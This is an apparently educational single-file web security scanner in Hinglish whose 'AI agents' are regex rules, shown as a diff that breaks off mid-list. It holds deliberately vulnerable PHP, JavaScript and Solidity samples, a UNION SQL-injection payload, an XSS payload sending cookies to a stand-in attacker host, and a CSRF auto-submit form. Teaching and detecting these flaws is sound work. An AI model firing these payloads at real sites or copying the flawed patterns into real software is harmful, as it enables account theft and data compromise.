@@ -1,0 +1,1474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ARTEX 60-Agent Security Suite — Portable Edition</title>
+<meta name="description" content="60 AI security agents — attack & defence detection with exact code. Single-file, offline-capable, GitHub Pages ready.">
+<style>
+:root{
+  --bg:#050807; --bg2:#0a0f0d; --card:#0d1412; --line:#1c2b26;
+  --txt:#d7e4de; --mut:#6b8579; --em:#10b981; --em2:#34d399;
+  --red:#ef4444; --amb:#f59e0b; --pur:#a78bfa; --cyan:#22d3ee;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,-apple-system,sans-serif;min-height:100vh}
+code,pre,.mono{font-family:'Consolas','Courier New',monospace}
+.wrap{max-width:1280px;margin:0 auto;padding:0 16px}
+
+/* scanline + grid bg */
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:repeating-linear-gradient(0deg,transparent 0 2px,rgba(16,185,129,.012) 2px 4px)}
+.grid-bg{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.25;
+  background-image:linear-gradient(rgba(16,185,129,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(16,185,129,.05) 1px,transparent 1px);
+  background-size:42px 42px}
+
+/* HEADER */
+header{border-bottom:1px solid var(--line);background:rgba(5,8,7,.92);backdrop-filter:blur(8px);position:sticky;top:0;z-index:50}
+.hd{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:14px 0;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:12px}
+.logo-badge{width:44px;height:44px;border:2px solid var(--em);border-radius:10px;display:flex;align-items:center;justify-content:center;
+  font-weight:900;font-size:15px;color:var(--em);letter-spacing:1px;box-shadow:0 0 18px rgba(16,185,129,.35);animation:pulseG 3s infinite}
+@keyframes pulseG{0%,100%{box-shadow:0 0 18px rgba(16,185,129,.35)}50%{box-shadow:0 0 34px rgba(16,185,129,.6)}}
+.logo h1{font-size:20px;font-weight:900;letter-spacing:2px}
+.logo h1 span{color:var(--em)}
+.hd-sub{font-size:11px;color:var(--mut);letter-spacing:1px}
+.hd-right{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.ver-chip{font-size:10px;border:1px solid var(--em);color:var(--em);padding:4px 10px;border-radius:99px;letter-spacing:1px;font-weight:700}
+.ver-chip.dim{border-color:var(--line);color:var(--mut)}
+
+/* HERO */
+.hero{padding:36px 0 20px;text-align:center;position:relative;z-index:1}
+.hero .tag{display:inline-block;font-size:11px;letter-spacing:3px;color:var(--em);border:1px solid rgba(16,185,129,.4);padding:6px 16px;border-radius:99px;margin-bottom:16px;background:rgba(16,185,129,.06)}
+.hero h2{font-size:clamp(24px,4.5vw,42px);font-weight:900;letter-spacing:1px;line-height:1.15}
+.hero h2 .g{color:var(--em);text-shadow:0 0 24px rgba(16,185,129,.5)}
+.hero h2 .r{color:var(--red);text-shadow:0 0 24px rgba(239,68,68,.4)}
+.hero p{color:var(--mut);max-width:760px;margin:12px auto 0;font-size:14px;line-height:1.7}
+.stats{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:22px}
+.stat{border:1px solid var(--line);background:var(--card);border-radius:12px;padding:10px 18px;min-width:110px}
+.stat b{display:block;font-size:22px;color:var(--em)}
+.stat span{font-size:10px;color:var(--mut);letter-spacing:1.5px}
+
+/* CONSOLE INPUT */
+.console{margin:26px 0;position:relative;z-index:1}
+.console-card{border:1px solid var(--line);border-radius:16px;background:linear-gradient(180deg,var(--bg2),var(--bg));overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.console-hd{display:flex;align-items:center;gap:8px;padding:10px 16px;border-bottom:1px solid var(--line);background:rgba(13,20,18,.8);flex-wrap:wrap}
+.dot{width:10px;height:10px;border-radius:50%}
+.console-hd .t{font-size:11px;letter-spacing:2px;color:var(--mut);margin-left:6px}
+.console-hd .sp{flex:1}
+.lang-chip{font-size:10px;padding:3px 10px;border-radius:99px;border:1px solid var(--line);color:var(--mut)}
+.lang-chip.on{border-color:var(--em);color:var(--em);font-weight:700}
+#codeInput{width:100%;min-height:190px;background:transparent;border:0;outline:0;resize:vertical;color:var(--em2);
+  font-family:Consolas,monospace;font-size:13px;line-height:1.6;padding:16px}
+#codeInput::placeholder{color:#3d5449}
+.console-ft{display:flex;gap:8px;padding:12px 16px;border-top:1px solid var(--line);flex-wrap:wrap;align-items:center}
+button{cursor:pointer;font-family:inherit;transition:.18s}
+.btn{border:1px solid var(--em);background:rgba(16,185,129,.12);color:var(--em2);padding:11px 22px;border-radius:10px;font-weight:800;letter-spacing:1px;font-size:13px}
+.btn:hover{background:var(--em);color:#04110b;box-shadow:0 0 24px rgba(16,185,129,.5)}
+.btn:disabled{opacity:.35;cursor:not-allowed;box-shadow:none}
+.btn.run{font-size:14px;padding:12px 30px}
+.btn.ghost{border-color:var(--line);background:transparent;color:var(--mut)}
+.btn.ghost:hover{border-color:var(--mut);color:var(--txt);box-shadow:none}
+.btn.red{border-color:var(--red);background:rgba(239,68,68,.1);color:#fca5a5}
+.btn.red:hover{background:var(--red);color:#fff;box-shadow:0 0 20px rgba(239,68,68,.4)}
+.samples{display:flex;gap:6px;flex-wrap:wrap;margin-left:auto}
+.sample{font-size:10px;padding:6px 12px;border-radius:99px;border:1px dashed var(--line);color:var(--mut);background:transparent}
+.sample:hover{border-color:var(--amb);color:var(--amb)}
+
+/* LIVE BAR */
+.livebar{display:none;align-items:center;gap:12px;padding:10px 16px;border-top:1px solid var(--line);background:rgba(13,20,18,.6)}
+.livebar.on{display:flex}
+.scanwave{display:flex;gap:3px;align-items:flex-end;height:18px}
+.scanwave i{width:4px;background:var(--em);border-radius:2px;animation:wv .7s infinite ease-in-out}
+.scanwave i:nth-child(2){animation-delay:.1s}.scanwave i:nth-child(3){animation-delay:.2s}
+.scanwave i:nth-child(4){animation-delay:.3s}.scanwave i:nth-child(5){animation-delay:.4s}
+@keyframes wv{0%,100%{height:5px}50%{height:18px}}
+#liveTxt{font-size:12px;color:var(--em2);letter-spacing:1px}
+.prog{flex:1;height:6px;background:var(--line);border-radius:99px;overflow:hidden;min-width:120px}
+.prog i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--em),var(--cyan));transition:.25s}
+
+/* TERMINAL */
+.term{display:none;margin:18px 0;border:1px solid var(--line);border-radius:14px;background:#020403;overflow:hidden}
+.term.on{display:block}
+.term-hd{padding:8px 14px;border-bottom:1px solid var(--line);font-size:11px;color:var(--mut);letter-spacing:2px;display:flex;gap:8px;align-items:center}
+.term-body{padding:12px 14px;max-height:240px;overflow-y:auto;font-family:Consolas,monospace;font-size:12px;line-height:1.75}
+.term-body::-webkit-scrollbar{width:8px}.term-body::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px}
+.tl{white-space:pre-wrap;word-break:break-word}
+.tl.ok{color:var(--em2)}.tl.bad{color:#f87171}.tl.warn{color:var(--amb)}.tl.mut{color:#4f6a5e}.tl.info{color:var(--cyan)}
+
+/* VERDICT */
+.verdict{display:none;margin:18px 0;border-radius:16px;border:1px solid var(--line);overflow:hidden;position:relative;z-index:1}
+.verdict.on{display:block}
+.vd-top{display:flex;gap:20px;align-items:center;padding:22px;flex-wrap:wrap}
+.score-ring{width:120px;height:120px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-direction:column;flex-shrink:0;
+  background:conic-gradient(var(--em) calc(var(--sc)*1%), #14201b 0);position:relative}
+.score-ring::before{content:"";position:absolute;inset:9px;border-radius:50%;background:var(--bg2)}
+.score-ring b{position:relative;font-size:30px;z-index:1}
+.score-ring span{position:relative;font-size:9px;color:var(--mut);letter-spacing:2px;z-index:1}
+.vd-main{flex:1;min-width:240px}
+.vd-main h3{font-size:26px;font-weight:900;letter-spacing:2px}
+.vd-main p{color:var(--mut);font-size:13px;margin-top:6px;line-height:1.6}
+.vd-chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.chip{font-size:10px;letter-spacing:1px;padding:5px 12px;border-radius:99px;border:1px solid;font-weight:700}
+.chip.c{border-color:var(--red);color:#f87171;background:rgba(239,68,68,.08)}
+.chip.h{border-color:#fb923c;color:#fdba74;background:rgba(251,146,60,.08)}
+.chip.m{border-color:var(--amb);color:#fcd34d;background:rgba(245,158,11,.08)}
+.chip.l{border-color:var(--cyan);color:#67e8f9;background:rgba(34,211,238,.08)}
+.chip.s{border-color:var(--em);color:var(--em2);background:rgba(16,185,129,.08)}
+.chip.p{border-color:var(--pur);color:#c4b5fd;background:rgba(167,139,250,.08)}
+
+/* FILTERS */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin:16px 0;align-items:center;position:relative;z-index:1}
+.fbtn{font-size:11px;padding:7px 14px;border-radius:99px;border:1px solid var(--line);background:var(--card);color:var(--mut);letter-spacing:1px}
+.fbtn.on{border-color:var(--em);color:var(--em);font-weight:700}
+
+/* FINDINGS */
+.findings{display:grid;gap:14px;margin-bottom:24px;position:relative;z-index:1}
+.finding{border:1px solid var(--line);border-left:4px solid var(--red);border-radius:12px;background:var(--card);overflow:hidden;animation:slideIn .3s ease}
+@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.finding.h{border-left-color:#fb923c}.finding.m{border-left-color:var(--amb)}.finding.l{border-left-color:var(--cyan)}.finding.p{border-left-color:var(--pur)}
+.f-hd{display:flex;align-items:center;gap:10px;padding:13px 16px;flex-wrap:wrap;cursor:pointer}
+.f-hd .aid{font-size:10px;font-weight:800;letter-spacing:1px;color:var(--bg);background:var(--red);padding:3px 9px;border-radius:6px}
+.finding.h .f-hd .aid{background:#fb923c}.finding.m .f-hd .aid{background:var(--amb)}.finding.l .f-hd .aid{background:var(--cyan)}.finding.p .f-hd .aid{background:var(--pur)}
+.f-hd .ttl{font-weight:800;font-size:14px}
+.f-hd .ln{margin-left:auto;font-size:11px;color:var(--mut);font-family:Consolas,monospace}
+.sev{font-size:9px;font-weight:800;letter-spacing:1px;padding:3px 9px;border-radius:99px}
+.sev.CRITICAL{background:rgba(239,68,68,.15);color:#f87171;border:1px solid var(--red)}
+.sev.HIGH{background:rgba(251,146,60,.15);color:#fdba74;border:1px solid #fb923c}
+.sev.MEDIUM{background:rgba(245,158,11,.15);color:#fcd34d;border:1px solid var(--amb)}
+.sev.LOW{background:rgba(34,211,238,.15);color:#67e8f9;border:1px solid var(--cyan)}
+.sev.INFO{background:rgba(167,139,250,.15);color:#c4b5fd;border:1px solid var(--pur)}
+.f-desc{padding:0 16px 12px;color:#a8bfb4;font-size:13px;line-height:1.65}
+.f-ev{margin:0 16px 14px;border:1px dashed #2c443a;border-radius:10px;background:#060a08;padding:12px 14px}
+.f-ev .cap{font-size:10px;letter-spacing:2px;color:var(--mut);margin-bottom:6px}
+.f-ev pre{font-size:12px;color:#fda4af;white-space:pre-wrap;word-break:break-word}
+.tabsx{display:flex;gap:6px;padding:0 16px 12px}
+.tab{font-size:11px;font-weight:800;letter-spacing:1px;padding:8px 16px;border-radius:9px 9px 0 0;border:1px solid var(--line);border-bottom:0;background:transparent;color:var(--mut)}
+.tab.on-a{color:#f87171;border-color:rgba(239,68,68,.5);background:rgba(239,68,68,.07)}
+.tab.on-d{color:var(--em2);border-color:rgba(16,185,129,.5);background:rgba(16,185,129,.07)}
+.codebox{display:none;margin:0 16px 16px;border:1px solid var(--line);border-radius:0 10px 10px 10px;background:#020403;position:relative}
+.codebox.show{display:block}
+.codebox pre{padding:14px 16px;font-size:12px;line-height:1.7;overflow-x:auto;white-space:pre-wrap;word-break:break-word}
+.codebox.atk pre{color:#fda4af}
+.codebox.def pre{color:#6ee7b7}
+.copyb{position:absolute;top:8px;right:8px;font-size:10px;padding:4px 10px;border-radius:7px;border:1px solid var(--line);background:var(--card);color:var(--mut)}
+.copyb:hover{border-color:var(--em);color:var(--em)}
+
+/* AGENT GRID */
+.sect-hd{display:flex;align-items:center;gap:12px;margin:30px 0 14px;position:relative;z-index:1;flex-wrap:wrap}
+.sect-hd h3{font-size:15px;font-weight:900;letter-spacing:2px}
+.sect-hd .ln2{flex:1;height:1px;background:var(--line)}
+.sect-hd .cnt{font-size:11px;color:var(--mut);letter-spacing:1px}
+.agents{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;position:relative;z-index:1;margin-bottom:28px}
+.agent{border:1px solid var(--line);border-radius:11px;background:var(--card);padding:11px 12px;transition:.2s;position:relative;overflow:hidden}
+.agent .st{position:absolute;top:0;right:0;width:34px;height:34px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.agent .dom{font-size:9px;letter-spacing:1.5px;color:var(--mut)}
+.agent .nm{font-size:12px;font-weight:800;margin-top:3px;letter-spacing:.5px}
+.agent .rl{font-size:10px;color:var(--mut);margin-top:2px;min-height:26px;line-height:1.4}
+.agent .status{font-size:10px;font-weight:800;letter-spacing:1px;margin-top:7px;color:#3d5449}
+.agent.work{border-color:var(--cyan);box-shadow:0 0 14px rgba(34,211,238,.15)}
+.agent.work .status{color:var(--cyan);animation:blink 1s infinite}
+@keyframes blink{50%{opacity:.35}}
+.agent.hit{border-color:var(--red);box-shadow:0 0 16px rgba(239,68,68,.2)}
+.agent.hit .status{color:#f87171}
+.agent.okay{border-color:rgba(16,185,129,.5)}
+.agent.okay .status{color:var(--em2)}
+.agent.skip{opacity:.42}
+.agent.skip .status{color:#3d5449}
+
+/* BLACKHAT */
+.bh{display:none;border:1px solid rgba(239,68,68,.4);border-radius:16px;background:linear-gradient(180deg,rgba(239,68,68,.05),var(--bg2));margin:20px 0;overflow:hidden;position:relative;z-index:1}
+.bh.on{display:block}
+.bh-hd{padding:14px 18px;border-bottom:1px solid rgba(239,68,68,.25);display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.bh-hd h3{font-size:14px;font-weight:900;letter-spacing:2px;color:#f87171}
+.bh-hd .tag{font-size:9px;color:var(--mut);border:1px solid var(--line);padding:3px 10px;border-radius:99px;letter-spacing:1px}
+.bh-body{padding:16px 18px;display:grid;gap:12px}
+.bh-item{border:1px solid var(--line);border-radius:11px;background:#080605;padding:13px 15px}
+.bh-item .h{display:flex;gap:8px;align-items:center;flex-wrap:wrap;font-weight:800;font-size:13px}
+.bh-item .path{color:var(--mut);font-size:12px;line-height:1.7;margin-top:6px}
+.bh-item .path b{color:#fda4af}
+.bh-item.blocked{border-color:rgba(16,185,129,.4)}
+.bh-item.blocked .h{color:var(--em2)}
+
+/* GUIDE */
+.guide{border:1px solid var(--line);border-radius:16px;background:var(--card);margin:26px 0 40px;overflow:hidden;position:relative;z-index:1}
+.guide-hd{padding:16px 18px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px;cursor:pointer;flex-wrap:wrap}
+.guide-hd h3{font-size:14px;font-weight:900;letter-spacing:1px}
+.guide-hd .arw{margin-left:auto;color:var(--mut);transition:.2s}
+.guide.open .arw{transform:rotate(90deg)}
+.guide-bd{display:none;padding:18px}
+.guide.open .guide-bd{display:block}
+.step{display:flex;gap:14px;margin-bottom:16px}
+.step .no{width:30px;height:30px;border-radius:50%;border:2px solid var(--em);color:var(--em);display:flex;align-items:center;justify-content:center;font-weight:900;font-size:13px;flex-shrink:0}
+.step .bd{flex:1}
+.step .bd b{color:var(--em2);font-size:13.5px}
+.step .bd p{color:var(--mut);font-size:12.5px;margin-top:3px;line-height:1.6}
+.step .bd pre{margin-top:7px;background:#020403;border:1px solid var(--line);border-radius:8px;padding:10px 13px;font-size:11.5px;color:#86efac;overflow-x:auto;white-space:pre-wrap;word-break:break-word;line-height:1.6}
+.note{border:1px dashed var(--amb);background:rgba(245,158,11,.06);border-radius:10px;padding:12px 15px;font-size:12.5px;color:#fcd34d;line-height:1.6;margin-top:6px}
+
+footer{border-top:1px solid var(--line);padding:20px 0 30px;text-align:center;color:var(--mut);font-size:11px;letter-spacing:1px;position:relative;z-index:1;line-height:2}
+footer b{color:var(--em)}
+@media(max-width:640px){.hd-right{width:100%}.samples{margin-left:0}.vd-top{gap:14px}}
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<header>
+  <div class="wrap hd">
+    <div class="logo">
+      <div class="logo-badge">AX</div>
+      <div>
+        <h1>ARTEX <span>60-AGENT</span></h1>
+        <div class="hd-sub">SECURITY SUITE — PORTABLE EDITION · ATTACK ⇄ DEFENCE</div>
+      </div>
+    </div>
+    <div class="hd-right">
+      <span class="ver-chip">v3.0 PORTABLE</span>
+      <span class="ver-chip dim">60 AGENTS</span>
+      <span class="ver-chip dim">100% CLIENT-SIDE</span>
+    </div>
+  </div>
+</header>
+
+<section class="wrap hero">
+  <div class="tag">⚡ 60 AI AGENTS · LIVE SWARM SCAN · ETHICAL LEARNING</div>
+  <h2>ATTACK <span class="r">dhoondo.</span> DEFENCE <span class="g">seekho.</span><br>EK FILE ME SAB.</h2>
+  <p>Code paste karo — <b>60 specialized AI agents</b> parallel swarm bana ke har line scan karte hain: exploit path (<span style="color:#f87171">ATTACK code</span>) + exact fix (<span style="color:#34d399">DEFENCE code</span>) + line-number evidence. Solidity · PHP · Website/JS — auto-detect. Koi server nahi, koi install nahi — <b>sirf ye 1 file.</b></p>
+  <div class="stats">
+    <div class="stat"><b>60</b><span>AI AGENTS</span></div>
+    <div class="stat"><b id="stDet">0</b><span>LIVE FINDINGS</span></div>
+    <div class="stat"><b>3</b><span>DOMAINS</span></div>
+    <div class="stat"><b>100%</b><span>OFFLINE SAFE</span></div>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <!-- CONSOLE -->
+  <div class="console">
+    <div class="console-card">
+      <div class="console-hd">
+        <span class="dot" style="background:#ef4444"></span>
+        <span class="dot" style="background:#f59e0b"></span>
+        <span class="dot" style="background:#10b981"></span>
+        <span class="t">ARTEX-60 // PASTE TARGET CODE</span>
+        <span class="sp"></span>
+        <span class="lang-chip" id="chipAUTO">AUTO-DETECT: —</span>
+      </div>
+      <textarea id="codeInput" spellcheck="false" placeholder="// yahan paste karo:
+  • Solidity contract (pragma, contract, function...)
+  • PHP code (&lt;?php, echo, mysqli...)
+  • Website/JS/HTML (fetch, document., form, http://...)
+
+ya neeche SAMPLE buttons se demo code load karo →"></textarea>
+      <div class="console-ft">
+        <button class="btn run" id="btnRun" disabled>▶ RUN 60 AGENTS</button>
+        <button class="btn ghost" id="btnClear" disabled>CLEAR</button>
+        <div class="samples">
+          <button class="sample" data-s="sol">☠ SOLIDITY VULN</button>
+          <button class="sample" data-s="solc">✓ SOLIDITY CLEAN</button>
+          <button class="sample" data-s="php">☠ PHP VULN</button>
+          <button class="sample" data-s="web">☠ WEBSITE VULN</button>
+        </div>
+      </div>
+      <div class="livebar" id="livebar">
+        <div class="scanwave"><i></i><i></i><i></i><i></i><i></i></div>
+        <span id="liveTxt">BOOTING SWARM…</span>
+        <div class="prog"><i id="progBar"></i></div>
+        <span id="liveCount" class="mono" style="font-size:11px;color:var(--mut)">0/60</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- TERMINAL -->
+  <div class="term" id="term">
+    <div class="term-hd"><span class="dot" style="background:#10b981;width:8px;height:8px"></span> SWARM TERMINAL — LIVE</div>
+    <div class="term-body" id="termBody"></div>
+  </div>
+
+  <!-- VERDICT -->
+  <div class="verdict" id="verdict">
+    <div class="vd-top">
+      <div class="score-ring" id="ring"><b id="scoreN">0</b><span>/100</span></div>
+      <div class="vd-main">
+        <h3 id="vdTxt">—</h3>
+        <p id="vdWhy"></p>
+        <div class="vd-chips" id="vdChips"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FILTERS + FINDINGS -->
+  <div class="filters" id="filters" style="display:none">
+    <b style="font-size:11px;letter-spacing:2px;color:var(--mut)">FILTER:</b>
+    <button class="fbtn on" data-f="ALL">ALL</button>
+    <button class="fbtn" data-f="CRITICAL">CRITICAL</button>
+    <button class="fbtn" data-f="HIGH">HIGH</button>
+    <button class="fbtn" data-f="MEDIUM">MEDIUM</button>
+    <button class="fbtn" data-f="LOW">LOW</button>
+    <button class="fbtn" data-f="INFO">INFO</button>
+    <button class="btn ghost" id="btnReport" style="margin-left:auto">⬇ DOWNLOAD REPORT</button>
+  </div>
+  <div class="findings" id="findings"></div>
+
+  <!-- BLACK HAT -->
+  <div class="bh" id="bh">
+    <div class="bh-hd">
+      🎩<h3>BLACK HAT PERSPECTIVE — ATTACKER VIEW</h3>
+      <span class="tag">ETHICAL SIMULATION · DEFENCE PLANNING KE LIYE</span>
+    </div>
+    <div class="bh-body" id="bhBody"></div>
+  </div>
+
+  <!-- AGENT GRID -->
+  <div class="sect-hd">
+    <h3>🤖 SWARM ROSTER — 60 AI AGENTS</h3>
+    <div class="ln2"></div>
+    <span class="cnt" id="rosterCnt"></span>
+  </div>
+  <div class="agents" id="agents"></div>
+
+  <!-- GUIDE -->
+  <div class="guide open" id="guide">
+    <div class="guide-hd" onclick="document.getElementById('guide').classList.toggle('open')">
+      🚀 <h3>IS FILE KO GITHUB SE LIVE KARO (FREE) — 5 MINUTE GUIDE</h3>
+      <span class="arw">▶</span>
+    </div>
+    <div class="guide-bd">
+      <div class="step"><div class="no">1</div><div class="bd"><b>GitHub account + naya repository</b>
+        <p>github.com pe login → upar-right "+" icon → <b>New repository</b> → naam do (jaise <code>artex-security</code>) → <b>Public</b> select karo → <b>Create repository</b>.</p></div></div>
+      <div class="step"><div class="no">2</div><div class="bd"><b>index.html upload karo</b>
+        <p>Repo page pe <b>"uploading an existing file"</b> link dabao (ya Add file → Upload files) → ye <code>index.html</code> drag-drop karo → neeche <b>Commit changes</b> dabao.</p></div></div>
+      <div class="step"><div class="no">3</div><div class="bd"><b>GitHub Pages ON karo</b>
+        <p>Repo me → <b>Settings</b> → left sidebar me <b>Pages</b> → "Source" me <b>Deploy from a branch</b> → Branch: <b>main</b> + folder <b>/ (root)</b> → <b>Save</b>.</p></div></div>
+      <div class="step"><div class="no">4</div><div class="bd"><b>LIVE URL milega 🎉</b>
+        <p>1-2 minute wait karo → Pages tab pe green box aayega. Tumhara site LIVE:</p>
+        <pre>https://TUMHARA-USERNAME.github.io/artex-security/</pre></div></div>
+      <div class="step"><div class="no">5</div><div class="bd"><b>Update karna ho to</b>
+        <p>Bas repo me index.html edit karke commit karo — GitHub khud re-deploy kar dega (1 min).</p></div></div>
+      <div class="note">💡 <b>Alternatives:</b> Netlify Drop (app.netlify.com/drop — index.html drag karo, instant live) · Vercel · Cloudflare Pages. Sab free hain, par GitHub Pages sabse simple hai. ⚠️ Ye file 100% client-side hai — koi data kahin nahi jata, koi backend nahi chahiye.</div>
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <b>ARTEX 60-AGENT</b> — PORTABLE SECURITY SUITE · ETHICAL HACKING LEARNING TOOL<br>
+  Sirf apne code / test targets pe use karo. Unauthorized testing illegal hai. · 100% client-side · zero telemetry
+</footer>
+<script>
+/* ============ ARTEX 60-AGENT ENGINE — PORTABLE EDITION ============ */
+"use strict";
+
+const SAMPLES = {
+sol:`// SPDX-License-Identifier: MIT
+pragma solidity 0.7.6;
+
+contract VaultBank {
+    mapping(address => uint256) public balances;
+    address public owner;
+
+    constructor() { owner = msg.sender; }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 amt = balances[msg.sender];
+        (bool ok, ) = msg.sender.call{value: amt}("");
+        balances[msg.sender] = 0;
+    }
+
+    function mint(address to, uint256 amt) public {
+        balances[to] += amt;
+    }
+
+    function emergencyKill() public {
+        selfdestruct(payable(msg.sender));
+    }
+
+    function sweepToken(address token) public {
+        token.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, 999999));
+    }
+}`,
+solc:`// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract SafeVault is ERC20, ReentrancyGuard, Ownable {
+    mapping(address => uint256) public deposits;
+
+    constructor() ERC20("Safe", "SFE") Ownable(msg.sender) {}
+
+    function deposit() external payable nonReentrant {
+        deposits[msg.sender] += msg.value;
+    }
+
+    function withdraw(uint256 amt) external nonReentrant {
+        require(deposits[msg.sender] >= amt, "insufficient");
+        deposits[msg.sender] -= amt;
+        (bool ok, ) = msg.sender.call{value: amt}("");
+        require(ok, "transfer failed");
+    }
+
+    function mint(address to, uint256 amt) external onlyOwner {
+        _mint(to, amt);
+    }
+}`,
+php:`<?php
+// admin panel — user search
+session_start();
+$conn = mysqli_connect("localhost", "root", "", "shop");
+$uid = $_GET['id'];
+$res = mysqli_query($conn, "SELECT * FROM users WHERE id = " . $uid);
+$user = mysqli_fetch_assoc($res);
+echo "<h1>Profile: " . $user['name'] . "</h1>";
+echo "<p>Email: " . $_GET['email'] . "</p>";
+
+if (isset($_POST['save'])) {
+    include($_POST['tpl'] . ".php");
+}
+
+if (isset($_GET['cmd'])) {
+    system("ping -c 1 " . $_GET['cmd']);
+}
+
+$hash = md5($_POST['password']);
+setcookie("role", "user");
+setcookie("sid", rand(1000, 9999));
+if ($_POST['pass_admin'] == "admin123") { $is_admin = true; }
+eval($_POST['debug_code']);
+file_get_contents($_GET['fetch_url']);
+phpinfo();
+?>`,
+web:`<html>
+<head><title>Shop Admin</title></head>
+<body>
+<script>
+// search products
+function search() {
+  var q = document.getElementById("q").value;
+  fetch("/api/products?q=" + q).then(r => r.json()).then(d => {
+    document.getElementById("out").innerHTML = d.html;
+  });
+  document.write("<b>query:</b> " + q);
+}
+window.location.href = getUrlParam("next");
+
+function doLogin() {
+  var pw = document.getElementById("pw").value;
+  console.log("login attempt password:", pw);
+  fetch("http://api.shop.com/login", {method:"POST", body: JSON.stringify({pw: pw})});
+}
+
+var cfg = { jwtSecret: "supersecret123", dbPass: "root123" };
+var data = JSON.parse(getUrlParam("payload"));
+eval(data.action);
+<\/script>
+<form action="/pay" method="POST">
+  <input name="amount"><button>Pay</button>
+</form>
+</body>
+</html>`
+};
+
+/* ================= 60 AI AGENTS =================
+   dom: WEB | CHAIN | PHP   |  sev: CRITICAL|HIGH|MEDIUM|LOW|INFO
+   pats: [{re, fl, lb}]  atk/def: string[] (ATTACK / DEFENCE code)
+   gate: fn(src)->skipReason|null  (era/condition gating — v2.4 style) */
+
+const AGENTS_WEB = [
+{id:"SQLI-HUNTER", nm:"SQL Injection Hunter", dom:"WEB", sev:"CRITICAL",
+ d:"SQL query me user-input concat ho raha hai (string +, ${}, template) — error/union/boolean-based SQLi possible.",
+ pats:[
+  {re:/(?:SELECT|INSERT|UPDATE|DELETE)\s[^\n]{0,90}(?:\+\s*(?:q|user|param|input|val)|\$\{|["'`]\s*\+\s*\w)/gi, lb:"SQL text + dynamic concat"},
+  {re:/\.(?:query|execute)\s*\(\s*["'`][^"'`]*(?:SELECT|INSERT|UPDATE|DELETE)[^"'`]*["'`]\s*\+/gi, lb:"query() me concat"},
+  {re:/(?:SELECT|INSERT|UPDATE|DELETE)\s[^\n]{0,90}["'`]?\s*\+\s*getUrlParam|\bSELECT\s[^\n]{0,80}\bparams\b/gi, lb:"query + request param"}],
+ atk:["GET /api/products?q=' UNION SELECT username,password FROM users-- -",
+      "→ DB users table ka poora dump frontend pe aa jayega.",
+      "Blind: q=1' AND SLEEP(5)-- -  → response 5s late = SQLi confirmed."],
+ def:["const q = req.query.q;                       // 1. input alag rakho",
+      "db.query('SELECT * FROM products WHERE name LIKE ?', ['%'+q+'%']);",
+      "// 2. prepared statements / parameterized queries = input query ka hissa NAHI banta",
+      "// 3. ORM use karo (Prisma/Sequelize) + DB user ko minimum privilege do"]},
+
+{id:"XSS-STRIKE", nm:"XSS Strike Force", dom:"WEB", sev:"HIGH",
+ d:"innerHTML / document.write me user-data render — Reflected/DOM XSS se session hijack hota hai.",
+ pats:[
+  {re:/\.innerHTML\s*=\s*(?![\s]*["'`]\s*<)[^;\n]{0,60}(?:html|data|res|d|val|input|msg|content)/gi, lb:"innerHTML = dynamic data"},
+  {re:/document\.write(?:ln)?\s*\(\s*[^"')]{1,50}/gi, lb:"document.write + variable"},
+  {re:/insertAdjacentHTML\s*\(/gi, lb:"insertAdjacentHTML sink"},
+  {re:/\.html\s*\(\s*(?!["'`#])[a-zA-Z_$][\w$.[\]]{1,40}\s*\)/g, lb:"jQuery .html(variable)"}],
+ atk:["URL me payload inject karo jo search/html param me jata hai:",
+      "?q=<img src=x onerror='fetch(\"//evil.sh/?c=\"+document.cookie)'>",
+      "→ victim ke browser me chalega → session cookie attacker ko. (Stored XSS ho to har visitor pe.)"],
+ def:["el.textContent = data;                      // text only — HTML parse nahi hota",
+      "// HTML render hi karna ho: DOMPurify.sanitize(html) use karo",
+      "// + CSP header: script-src 'self' — inline attacker script block ho jayega",
+      "// document.write production me kabhi nahi"]},
+
+{id:"CSRF-GHOST", nm:"CSRF Ghost", dom:"WEB", sev:"MEDIUM",
+ d:"State-changing POST form/fetch me CSRF token nahi dikha — attacker victim ke browser se fake request bhej sakta hai.",
+ gate:(s)=>/(csrf|_token|xsrf|sameSite|samesite)/i.test(s)?null:"token/flag mila — safe",
+ pats:[
+  {re:/<form\b(?![^>]*csrf)[^>]*method\s*=\s*["']?post/gi, lb:"POST form without csrf field"},
+  {re:/method\s*:\s*["']POST["'][^}]{0,120}/gi, lb:"POST fetch — token check nahi"}],
+ atk:["Attacker apni site pe ye page rakh ke logged-in victim ko bhejta hai:",
+      "<form action='https://bank.com/transfer' method='POST'><input name='to' value='hacker'><input name='amt' value='99999'></form><script>document.forms[0].submit()<\/script>",
